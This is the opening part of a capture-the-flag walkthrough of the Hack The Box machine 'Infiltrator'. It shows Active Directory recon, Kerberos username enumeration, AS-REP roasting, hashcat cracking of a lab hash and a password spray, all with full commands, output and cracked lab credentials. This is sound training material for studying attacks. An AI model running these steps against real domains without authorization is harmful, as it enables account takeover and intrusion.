---
title: HTB: Infiltrator
url: https://0xdf.gitlab.io/2025/06/14/htb-infiltrator.html
date: 2025-06-14T13:45:00+00:00
difficulty: Insane [50]
os: Windows
tags: ctf, hackthebox, htb-infiltrator, nmap, windows, active-directory, feroxbuster, netexec, username-anarchy, kerbrute, as-rep-roast, hashcat, password-spray, protected-users, bloodhound, bloodhound-python, genericall, genericall-ou, forcechangepassword, addself, dacledit, shadow-credential, bloodyad, output-messagenger, chisel, foxy-proxy, dotpeek, reverse-engineering, cyberchef, aes-decrypt, rdp, pcap, bitlocker, secretsdump, ntds, ntds-sqlite, gmsadumper, adcs, esc4, htb-absolute, htb-rebound, htb-escapetwo
---

![Infiltrator](/img/infiltrator-cover.png)

Infiltrator is a very long box. It starts out with some people on a website. I’ll use those names to make usernames and brute force to find the username format. Then I’ll AS-REP-Roast to get initial creds. That user doesn’t have much, but I’ll spray the password around the other domain users and find another account with the same. This user is in the protected users group, so I’ll need to authenticate with Kerberos. From that user, Bloodhound data shows a path to another user where I’ll get a shell. There I’ll find Output Messager installed, and set up tunnels to access. I’ll find creds for a couple more pivots in the chat (including in a .NET exe from the chat), before exploiting the calendar functionality to get execution and another shell. In this users received files I’ll find a PCAP, and pull both more creds and a BitLocker backup file. I’ll find a recovery key in the backup, and connect with RDP and decrpyt the E drive to get access to a backup of the registry and NTDS information. I’ll dump that to get a shell as the next user, who has ReadGMSAPassword on a service account. That user can exploit ESC4 in the ADCS to get administrator access.

## Box Info

| Name | [Infiltrator](https://hackthebox.com/machines/infiltrator)  [Infiltrator](https://hackthebox.com/machines/infiltrator) [Play on HackTheBox](https://hackthebox.com/machines/infiltrator) |
| --- | --- |
| Release Date | [31 Aug 2024](https://twitter.com/hackthebox_eu/status/1829187286715470265) |
| Retire Date | 14 Jun 2025 |
| OS | Windows Windows |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Infiltrator |
| Radar Graph | Radar chart for Infiltrator |
| First Blood User | 01:44:28[kapiushion03 kapiushion03](https://app.hackthebox.com/users/1387134) |
| First Blood Root | 03:05:51[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [EmSec EmSec](https://app.hackthebox.com/users/962022) |

## Recon

### nmap

`nmap` finds many open TCP ports, in a combination that suggests a Windows active directory (AD) domain controller (DC):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.31
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 13:24 EDT
Nmap scan report for 10.10.11.31
Host is up (0.087s latency).
Not shown: 65510 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
15220/tcp open  unknown
15223/tcp open  unknown
15230/tcp open  unknown
49668/tcp open  unknown
49688/tcp open  unknown
49689/tcp open  unknown
49692/tcp open  unknown
49718/tcp open  unknown
49741/tcp open  unknown
49873/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds
oxdf@hacky$ nmap -p 53,80,88,135,139,389,445,593,636,3268,3269,3389,5985,9389,15220,15223,15230,49668,49688,49689,49692,49718,49741,49873 -sCV 10.10.11.31
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 13:26 EDT
Nmap scan report for 10.10.11.31
Host is up (0.087s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Infiltrator.htb
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-03 17:27:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-09-03T17:30:41+00:00; +32s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-09-03T17:30:41+00:00; +32s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-09-03T17:30:41+00:00; +32s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
|_ssl-date: 2024-09-03T17:30:41+00:00; +32s from scanner time.
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc01.infiltrator.htb
| Not valid before: 2024-07-30T13:20:17
|_Not valid after:  2025-01-29T13:20:17
|_ssl-date: 2024-09-03T17:30:41+00:00; +32s from scanner time.
| rdp-ntlm-info:
|   Target_Name: INFILTRATOR
|   NetBIOS_Domain_Name: INFILTRATOR
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: infiltrator.htb
|   DNS_Computer_Name: dc01.infiltrator.htb
|   DNS_Tree_Name: infiltrator.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-09-03T17:29:58+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
15220/tcp open  unknown
15223/tcp open  unknown
15230/tcp open  unknown
49668/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC
49741/tcp open  msrpc         Microsoft Windows RPC
49873/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-09-03T17:30:00
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 32s, deviation: 0s, median: 31s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.61 seconds

```

There’s a ton there. I’ll note the standard [DC ports](/cheatsheets/os#windows-domain-controller) (DNS on 53, Kerberos on 88, LDAP on 389 and other, SMB on 445, RPC on 135, and NetBios on 139). The hostname `DC01` and domain name `infiltrator.htb` are both leaked. There’s also a couple remote access ports, WinRM (5985) and remote desktop (RDP, 3389). There’s also an HTTP server on 80, and the title of that page is “Infiltrator.htb”. I’ll do a quick fuzz with `ffuf` to look for subdomains that respond differently, but not find any. I’ll add update my `hosts` with with `10.10.11.31 DC01.infiltrator.htb infiltrator.htb DC01`.

There’s also some unknown ports on 15220, 15223, and 15230.

### Website - TCP 80

#### Site

The site is for a digital marketing firm:

![image-20240903155946880](/img/image-20240903155946880.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

All of the links lead to places on the same page. There’s a section that shows seven team members:
- David Anderson - Digital Marketer
- Olivia Martinez - Chief Marketing
- Kevn Turner - QA Tester
- Amanda Walker - Co Founder
- Marcus Harris - Developer
- Lauren Clark - Digital Influencer
- Ethan Rodriguez - Digital Influence

There’s a contact form at the bottom, but it sends the form data as a GET request that just reloads that page and doesn’t seem to actually do anything.

#### Tech Stack

The main page loads as `/index.html`, suggesting it’s a static site (which fits everything else so far).

The 404 page is the default IIS page:

![image-20240903160609509](/img/image-20240903160609509.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x html` since I know the site is HTML, but it finds nothing:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.31 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x html --dont-extract-links

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.31
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 💲  Extensions            │ [html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      617l     1638w    31235c http://10.10.11.31/
301      GET        2l       10w      149c http://10.10.11.31/assets => http://10.10.11.31/assets/
301      GET        2l       10w      156c http://10.10.11.31/assets/images => http://10.10.11.31/assets/images/
301      GET        2l       10w      152c http://10.10.11.31/assets/js => http://10.10.11.31/assets/js/
301      GET        2l       10w      153c http://10.10.11.31/assets/css => http://10.10.11.31/assets/css/
200      GET      617l     1638w    31235c http://10.10.11.31/index.html
301      GET        2l       10w      155c http://10.10.11.31/assets/fonts => http://10.10.11.31/assets/fonts/
400      GET        6l       26w      324c http://10.10.11.31/error%1F_log
400      GET        6l       26w      324c http://10.10.11.31/error%1F_log.html
400      GET        6l       26w      324c http://10.10.11.31/assets/error%1F_log
400      GET        6l       26w      324c http://10.10.11.31/assets/error%1F_log.html
400      GET        6l       26w      324c http://10.10.11.31/assets/images/error%1F_log
400      GET        6l       26w      324c http://10.10.11.31/assets/images/error%1F_log.html
400      GET        6l       26w      324c http://10.10.11.31/assets/js/error%1F_log
400      GET        6l       26w      324c http://10.10.11.31/assets/css/error%1F_log
400      GET        6l       26w      324c http://10.10.11.31/assets/js/error%1F_log.html
400      GET        6l       26w      324c http://10.10.11.31/assets/css/error%1F_log.html
400      GET        6l       26w      324c http://10.10.11.31/assets/fonts/error%1F_log
400      GET        6l       26w      324c http://10.10.11.31/assets/fonts/error%1F_log.html
[####################] - 2m    159504/159504  0s      found:19      errors:0
[####################] - 2m     26584/26584   258/s   http://10.10.11.31/ 
[####################] - 2m     26584/26584   259/s   http://10.10.11.31/assets/ 
[####################] - 2m     26584/26584   259/s   http://10.10.11.31/assets/images/ 
[####################] - 2m     26584/26584   259/s   http://10.10.11.31/assets/js/ 
[####################] - 2m     26584/26584   259/s   http://10.10.11.31/assets/css/ 
[####################] - 2m     26584/26584   259/s   http://10.10.11.31/assets/fonts/

```

I’m using `--dont-extract-links` because there’s a bunch of images and JavaScript that will make the results much bigger that aren’t useful.

### SMB - TCP 445

`netexec` show the box is Windows 10 or Server 2019, with a hostname of DC01 and a domain of `infiltrator.htb`:

```

oxdf@hacky$ netexec smb infiltrator.htb
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)

```

Signing is enabled and SMBv1 is disabled. I’m not able to list shares without valid creds:

```

oxdf@hacky$ netexec smb infiltrator.htb --shares
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [-] IndexError: list index out of range
SMB         10.10.11.31     445    DC01             [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
oxdf@hacky$ netexec smb infiltrator.htb -u guest -p '' --shares
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\guest: STATUS_ACCOUNT_DISABLED 
oxdf@hacky$ netexec smb infiltrator.htb -u oxdf -p '' --shares
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\oxdf: STATUS_LOGON_FAILURE 

```

## Shell as M.Harris

### Auth as l.clark

#### Username Brute Force

I’ve got seven names from the website. I’ll use [username-anarchy](https://github.com/urbanadventurer/username-anarchy) to generate a list of possible usernames from that. I’ll start with this list (using the `username-anarchy` column headers) as `names.txt`:

```

firstname lastname
David Anderson
Olivia Martinez
Kevn Turner
Amanda Walker
Marcus Harris
Lauren Clark
Ethan Rodriguez

```

`username-anarchy` generates different possible usernames from this:

```

oxdf@hacky$ /opt/username-anarchy/username-anarchy -i names.txt > usernames.txt 
oxdf@hacky$ head usernames.txt 
david
davidanderson
david.anderson
davidand
daviande
davida
d.anderson
danderson
adavid
a.david

```

[kerbrute](https://github.com/ropnop/kerbrute) will check each of these against Kerberos to see if they are valid usernames:

```

oxdf@hacky$ kerbrute userenum -d infiltrator.htb usernames.txt --dc infiltrator.htb

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/03/24 - Ronnie Flathers @ropnop

2024/09/03 16:32:26 >  Using KDC(s):
2024/09/03 16:32:26 >   infiltrator.htb:88

2024/09/03 16:32:26 >  [+] VALID USERNAME:       d.anderson@infiltrator.htb
2024/09/03 16:32:26 >  [+] VALID USERNAME:       o.martinez@infiltrator.htb
2024/09/03 16:32:26 >  [+] VALID USERNAME:       k.turner@infiltrator.htb
2024/09/03 16:32:26 >  [+] VALID USERNAME:       a.walker@infiltrator.htb
2024/09/03 16:32:26 >  [+] VALID USERNAME:       m.harris@infiltrator.htb
2024/09/03 16:32:26 >  [+] VALID USERNAME:       e.rodriguez@infiltrator.htb
2024/09/03 16:32:27 >  [+] VALID USERNAME:       l.clark@infiltrator.htb
2024/09/03 16:32:27 >  Done! Tested 104 usernames (7 valid) in 0.966 seconds

```

The format is clearly `[first initial].[lastname]`.

#### AS-REP-Roast

With a list of valid users, I can check if any have the `DONT_REQUIRE_PREAUTH` bit set using `GetNPUsers.py` from [Impacket](https://github.com/SecureAuthCorp/impacket):

```

oxdf@hacky$ GetNPUsers.py infiltrator.htb/ -dc-ip 10.10.11.31 -usersfile valid_users 
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User d.anderson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User o.martinez doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User k.turner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a.walker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User m.harris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User e.rodriguez doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$l.clark@INFILTRATOR.HTB:55bacd8d8b7337e8481004cfa120d204$2c02190778c13465bd999c4c267031fc37039b14df8a486e01b569907eeb4ba8071ba38b6d9b3ac748e3a425bbb43b759f636e3ceb99cf4ba6fe02d81b8b9ee79b4766be2797a7a827666bd402913fe59fa6a9b8b5938000b612c4a08c874d3ef91b9df2445636104c6bd9c84236c01386de53e6f7e7cb261bfc98dced925a6f0831f1edeb6db1558e85c1ab7cb3364e421e8c9a114dce972e577feb92ce2e860f89c4280ab9c343c8bd52382545080141f68aba560b8d5dff3bed1138a8ffdcd7d90cc685292750d52017d0f69c5e766781099fd8c85cc91c186e70603162c77b334510ffad191a787fb58b81d0fc5bfef6

```

L.Clark does!

`netexec` can dump a hash via AS-REP-Roasting as well. As Infiltrator is retiring, there is a dev version of Kerbrute has a version in dev that will automatically do the AS-REP-Roast when it finds a user with the DONT\_REQUIRE\_PREAUTH flag set.

#### Hashcat

I’ll save that hash to a file and pass it to `hashcat` with the `rockyou.txt` wordlist:

```

$ hashcat l.clark.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

18200 | Kerberos 5, etype 23, AS-REP | Network Protocol
...[snip]...
$krb5asrep$23$l.clark@INFILTRATOR.HTB:55bacd8d8b7337e8481004cfa120d204$2c02190778c13465bd999c4c267031fc37039b14df8a486e01b569907eeb4ba8071ba38b6d9b3ac748e3a425bbb43b759f636e3ceb99cf4ba6fe02d81b8b9ee79b4766be2797a7a827666bd402913fe59fa6a9b8b5938000b612c4a08c874d3ef91b9df2445636104c6bd9c84236c01386de53e6f7e7cb261bfc98dced925a6f0831f1edeb6db1558e85c1ab7cb3364e421e8c9a114dce972e577feb92ce2e860f89c4280ab9c343c8bd52382545080141f68aba560b8d5dff3bed1138a8ffdcd7d90cc685292750d52017d0f69c5e766781099fd8c85cc91c186e70603162c77b334510ffad191a787fb58b81d0fc5bfef6:WAT?watismypass!
...[snip]...

```

The hash cracks in less than a second to “WAT?watismypass!”.

#### Validate Password

The password works for SMB:

```

oxdf@hacky$ netexec smb infiltrator.htb -u l.clark -p 'WAT?watismypass!'
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 

```

It doesn’t work for WinRM, but `netexec` says it does for RDP:

```

oxdf@hacky$ netexec winrm infiltrator.htb -u l.clark -p 'WAT?watismypass!'
WINRM       10.10.11.31     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb)
WINRM       10.10.11.31     5985   DC01             [-] infiltrator.htb\l.clark:WAT?watismypass!
oxdf@hacky$ netexec rdp infiltrator.htb -u l.clark -p 'WAT?watismypass!'
RDP         10.10.11.31     3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:infiltrator.htb) (nla:True)
RDP         10.10.11.31     3389   DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 

```

I am not able to get a connection though, as the server just resets the connection when I connect.

The SMB shares are the standard DC ones:

```

oxdf@hacky$ netexec smb infiltrator.htb -u l.clark -p 'WAT?watismypass!' --shares
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 
SMB         10.10.11.31     445    DC01             [*] Enumerated shares
SMB         10.10.11.31     445    DC01             Share           Permissions     Remark
SMB         10.10.11.31     445    DC01             -----           -----------     ------
SMB         10.10.11.31     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.31     445    DC01             C$                              Default share
SMB         10.10.11.31     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.31     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.31     445    DC01             SYSVOL          READ            Logon server share 

```

There’s nothing interesting on them.

### Auth as D.Anderson

#### User Enumeration

I was able to find seven usernames from the website, but it’s worth checking for addition users:

```

oxdf@hacky$ netexec smb infiltrator.htb -u l.clark -p 'WAT?watismypass!' --users
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 
SMB         10.10.11.31     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.11.31     445    DC01             Administrator                 2024-08-21 19:58:28 0       Built-in account for administering the computer/domain
SMB         10.10.11.31     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.11.31     445    DC01             krbtgt                        2023-12-04 17:36:16 0       Key Distribution Center Service Account
SMB         10.10.11.31     445    DC01             D.anderson                    2023-12-04 18:56:02 0        
SMB         10.10.11.31     445    DC01             L.clark                       2023-12-04 19:04:24 0        
SMB         10.10.11.31     445    DC01             M.harris                      2024-09-05 01:56:45 0        
SMB         10.10.11.31     445    DC01             O.martinez                    2024-02-25 15:41:03 0        
SMB         10.10.11.31     445    DC01             A.walker                      2023-12-05 22:06:28 0        
SMB         10.10.11.31     445    DC01             K.turner                      2024-02-25 15:40:35 0       MessengerApp@Pass! 
SMB         10.10.11.31     445    DC01             E.rodriguez                   2024-09-05 01:56:45 0        
SMB         10.10.11.31     445    DC01             winrm_svc                     2024-08-02 22:42:45 0        
SMB         10.10.11.31     445    DC01             lan_managment                 2024-08-02 22:42:46 0        
SMB         10.10.11.31     445    DC01             [*] Enumerated 12 local users: INFILTRATOR

```

K.turner looks like they have a password in the LDAP comment, but it doesn’t work on the domain:

```

oxdf@hacky$ netexec smb infiltrator.htb -u K.turner -p 'MessengerApp@Pass!'
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\K.turner:MessengerApp@Pass! STATUS_LOGON_FAILURE 

```

I’ll use that later.

#### Password Spray

I’ve got two passwords so far. I’ll check them against the updated user list:

```

oxdf@hacky$ netexec smb infiltrator.htb -u valid_usernames.txt -p passwords --continue-on-success
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\D.anderson:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION 
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\L.clark:WAT?watismypass! 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\M.harris:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\O.martinez:WAT?watismypass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\A.walker:WAT?watismypass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\K.turner:WAT?watismypass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\E.rodriguez:WAT?watismypass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\winrm_svc:WAT?watismypass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\lan_managment:WAT?watismypass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\D.anderson:MessengerApp@Pass! STATUS_ACCOUNT_RESTRICTION 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\M.harris:MessengerApp@Pass! STATUS_ACCOUNT_RESTRICTION 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\O.martinez:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\A.walker:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\K.turner:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\E.rodriguez:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\winrm_svc:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\lan_managment:MessengerApp@Pass! STATUS_LOGON_FAILURE

```

Still only L.Clark is successful, but I’ll notice for both passwords that two users, D.Anderson and M.Harris, return `STATUS_ACCOUNT_RESTRICTION` (marked by a purple `[-]`). This status can mean that the user [is in the Protected Users Group](https://blog.whiteflag.io/blog/protected-users-you-thought-you-were-safe/), which doesn’t allow NTLM authentication

I’ll try again with `-k`:

```

oxdf@hacky$ netexec smb infiltrator.htb -u valid_usernames.txt -p passwords --continue-on-success -k
SMB         infiltrator.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         infiltrator.htb 445    DC01             [+] infiltrator.htb\D.anderson:WAT?watismypass! 
SMB         infiltrator.htb 445    DC01             [+] infiltrator.htb\L.clark:WAT?watismypass! 
SMB         infiltrator.htb 445    DC01             [-] infiltrator.htb\M.harris:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         infiltrator.htb 445    DC01             [-] infiltrator.htb\O.martinez:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         infiltrator.htb 445    DC01             [-] infiltrator.htb\A.walker:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         infiltrator.htb 445    DC01             [-] infiltrator.htb\K.turner:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         infiltrator.htb 445    DC01             [-] infiltrator.htb\E.rodriguez:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         infiltrator.htb 445    DC01             [-] infiltrator.htb\winrm_svc:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         infiltrator.htb 445    DC01             [-] infiltrator.htb\lan_managment:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         infiltrator.htb 445    DC01             [-] infiltrator.htb\M.harris:MessengerApp@Pass! KDC_ERR_PREAUTH_FAILED 
SMB         infiltrator.htb 445    DC01             [-] infiltrator.htb\O.martinez:MessengerApp@Pass! KDC_ERR_PREAUTH_FAILED 
SMB         infiltrator.htb 445    DC01             [-] infiltrator.htb\A.walker:MessengerApp@Pass! KDC_ERR_PREAUTH_FAILED 
SMB         infiltrator.htb 445    DC01             [-] infiltrator.htb\K.turner:MessengerApp@Pass! KDC_ERR_PREAUTH_FAILED 
SMB         infiltrator.htb 445    DC01             [-] infiltrator.htb\E.rodriguez:MessengerApp@Pass! KDC_ERR_PREAUTH_FAILED 
SMB         infiltrator.htb 445    DC01             [-] infiltrator.htb\winrm_svc:MessengerApp@Pass! KDC_ERR_PREAUTH_FAILED 
SMB         infiltrator.htb 445    DC01             [-] infiltrator.htb\lan_managment:MessengerApp@Pass! KDC_ERR_PREAUTH_FAILED

```

D.Anderson uses the same password!

#### Validate Password

The password works, but nothing new on SMB:

```

oxdf@hacky$ netexec smb infiltrator.htb -u d.anderson -p 'WAT?watismypass!' -k --shares
SMB         infiltrator.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         infiltrator.htb 445    DC01             [+] infiltrator.htb\d.anderson:WAT?watismypass! 
SMB         infiltrator.htb 445    DC01             [*] Enumerated shares
SMB         infiltrator.htb 445    DC01             Share           Permissions     Remark
SMB         infiltrator.htb 445    DC01             -----           -----------     ------
SMB         infiltrator.htb 445    DC01             ADMIN$                          Remote Admin
SMB         infiltrator.htb 445    DC01             C$                              Default share
SMB         infiltrator.htb 445    DC01             IPC$            READ            Remote IPC
SMB         infiltrator.htb 445    DC01             NETLOGON        READ            Logon server share 
SMB         infiltrator.htb 445    DC01             SYSVOL          READ            Logon server share 

```

### BloodHound

#### Collection

As soon as I have creds, I’ll run [BloodHound](https://github.com/BloodHoundAD/BloodHound) to check out the permissions within the active directory environment:

```

oxdf@hacky$ bloodhound-python -c All -d infiltrator.htb -u l.clark -p 'WAT?watismypass!' -ns 10.10.11.31 --zip
INFO: Found AD domain: infiltrator.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.infiltrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.infiltrator.htb
INFO: Found 14 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.infiltrator.htb

```

#### Analysis

On opening up the data in BloodHound, I’ll mark L.Clark as owned. They don’t have any interesting access.

d.ansderson, on the other hand, shows one object with first degree object control:

![image-20240905060700725](/img/image-20240905060700725.png)

That is `GenericAll` over the Marketing Digital OU:

![image-20240905060840575](/img/image-20240905060840575.png)

Working down the chain of outbound control, I’ll find this graph:

![image-20240905061058454](/img/image-20240905061058454.png)

### Auth as E.Rodriguez

#### Background

